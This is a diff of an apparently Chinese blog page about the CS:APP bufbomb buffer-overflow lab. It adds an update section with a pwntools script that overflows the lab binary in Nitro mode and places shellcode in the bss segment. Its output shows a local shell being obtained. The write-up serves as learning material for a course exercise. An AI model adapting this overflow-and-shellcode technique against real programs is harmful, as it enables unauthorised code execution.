@@ -1572,6 +1572,19 @@
     Nitro mode
   </a>
   
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" title="更新" class="md-nav__link">
+    更新
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
         
       </ul>
@@ -1580,7 +1593,7 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_7" title="环境说明" class="md-nav__link">
+  <a href="#_8" title="环境说明" class="md-nav__link">
     环境说明
   </a>
   
@@ -2606,6 +2619,19 @@
     Nitro mode
   </a>
   
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" title="更新" class="md-nav__link">
+    更新
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
         
       </ul>
@@ -2614,7 +2640,7 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_7" title="环境说明" class="md-nav__link">
+  <a href="#_8" title="环境说明" class="md-nav__link">
     环境说明
   </a>
   
@@ -3394,7 +3420,7 @@
 </div>
 <p>没有问题。完结撒花。</p>
 <h3 id="nitro-mode">Nitro mode</h3>
-<p>其实我们的实验没要求这个，我还没空去看这是干嘛的，昨晚在大佬的指引下搞了这个getshell：</p>
+<p>其实我们的实验没要求这个，我还没空去看这是干嘛的，昨晚在大佬的指导下搞了这个getshell：</p>
 <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
 2
 3
@@ -3446,7 +3472,56 @@
 </div>
 <p>有关详细信息，请参考：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/#ret2shellcode">基本 ROP - ret2shellcode</a></p>
 <p>本菜鸡就不在这边现学现卖了...</p>
-<h2 id="_7">环境说明</h2>
+<h4 id="_7">更新</h4>
+<p>大佬：</p>
+<blockquote>
+<p>甚至不用关aslr就可以得到一个shell，有空再整</p>
+</blockquote>
+<p>好，膜。（两分钟后）大佬：</p>
+<blockquote>
+<p>突然想起来它<code class="codehilite"><span class="n">bss</span></code>应该也是可执行的，只要把shellcode写到<code class="codehilite"><span class="n">bss</span></code>就行了，不用那么麻烦</p>
+</blockquote>
+<p>有道理。搞起：</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
+2
+3
+4
+5
+6
+7
+8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;/home/domain/Documents/SZU/CSAPP/4/bufbomb&#39;</span><span class="p">,</span> <span class="s1">&#39;-n&#39;</span><span class="p">,</span> <span class="s1">&#39;-t&#39;</span><span class="p">,</span> <span class="s1">&#39;domain&#39;</span><span class="p">])</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
+<span class="n">address</span> <span class="o">=</span> <span class="mh">0x080489C0</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x20c</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804A200</span> <span class="o">+</span> <span class="mh">0x160</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804A200</span> <span class="o">+</span> <span class="mh">0x160</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">()))</span>
+</pre></div>
+</td></tr></table>
+
+<p>成功了：</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
+2
+3
+4
+5
+6
+7
+8
+9</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">domain</span><span class="o">/</span><span class="n">IdeaProjects</span><span class="o">/</span><span class="n">pwntools</span><span class="o">/</span><span class="n">venv</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">python</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">domain</span><span class="o">/</span><span class="n">IdeaProjects</span><span class="o">/</span><span class="n">pwntools</span><span class="o">/</span><span class="n">main</span><span class="p">.</span><span class="n">py</span><span class="w"></span>
+<span class="o">[</span><span class="n">x</span><span class="o">]</span><span class="w"> </span><span class="n">Starting</span><span class="w"> </span><span class="k">local</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="s1">&#39;/home/domain/Documents/SZU/CSAPP/4/bufbomb&#39;</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Starting</span><span class="w"> </span><span class="k">local</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="s1">&#39;/home/domain/Documents/SZU/CSAPP/4/bufbomb&#39;</span><span class="err">:</span><span class="w"> </span><span class="n">pid</span><span class="w"> </span><span class="mi">5702</span><span class="w"></span>
+<span class="nl">Team</span><span class="p">:</span><span class="w"> </span><span class="k">domain</span><span class="w"></span>
+<span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="mh">0x6dfd74c3</span><span class="w"></span>
+
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Switching</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">interactive</span><span class="w"> </span><span class="n">mode</span><span class="w"></span>
+<span class="n">ls</span><span class="w"></span>
+<span class="n">main</span><span class="p">.</span><span class="n">py</span><span class="w">  </span><span class="n">pwntools</span><span class="p">.</span><span class="n">iml</span><span class="w">  </span><span class="n">venv</span><span class="w"></span>
+</pre></div>
+</td></tr></table>
+
+<h2 id="_8">环境说明</h2>
 <ul>
 <li>不用说，肯定有IDA。</li>
 <li>pwntools，在Linux下很方便，我在IntelliJ IDEA（或者PyCharm）里写也很舒服。对于Windows，别忘了有WSL，你可以参考我的过往的文章来部署pwntools。</li>
